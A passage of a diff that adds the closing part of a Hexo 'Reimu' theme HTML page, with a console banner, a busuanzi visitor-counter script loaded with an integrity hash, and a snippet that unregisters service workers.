+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
